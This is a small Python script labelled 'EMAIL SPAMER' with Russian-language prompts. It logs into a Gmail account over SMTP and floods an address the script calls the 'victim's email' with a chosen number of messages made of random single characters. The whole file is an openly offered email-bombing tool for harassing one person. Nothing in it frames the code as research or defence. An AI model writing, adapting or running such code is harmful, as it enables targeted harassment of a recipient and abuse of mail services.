import smtplib

import random

import colorama
from colorama import Fore, Back, Style
colorama.init()

def send_email(EMAIL_ADDRESS, PASSWORD, EMAIL_ADDRESS2, subject, msg, k):
    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.ehlo()
        server.starttls()
        server.login(EMAIL_ADDRESS, PASSWORD)
        message = 'Subject: {}\n\n{}'.format(subject, msg)
        server.sendmail(EMAIL_ADDRESS, EMAIL_ADDRESS2, message)
        server.quit()
        print( Fore.YELLOW + "Сообщение " + str(k) + " отправлено!")
    except:
        print(Fore.RED + "Cообщение не отправлено!")

print(Fore.LIGHTGREEN_EX +"EMAIL SPAMER")
print(Fore.LIGHTGREEN_EX +"Автор: Warrior24")

Symbol = "qwertyuiopasdfghjklzxcvbnm1234567890"
EMAIL_ADDRESS = input("Ваш Gmail:")
PASSWORD = input("Ваш пароль:")
EMAIL_ADDRESS2 = input("Email жертвы:")
n = int(input("Кол-во сообщений(не более 80):"))
k = 1

while True:
      subject = random.choice(Symbol)
      msg = random.choice(Symbol)

      if  k < n:
          send_email(EMAIL_ADDRESS, PASSWORD, EMAIL_ADDRESS2, subject, msg, k)
          k = k + 1

      else:
          send_email(EMAIL_ADDRESS, PASSWORD, EMAIL_ADDRESS2, subject, msg, k)
          print(Fore.LIGHTGREEN_EX +"Завершение работы!")
          break
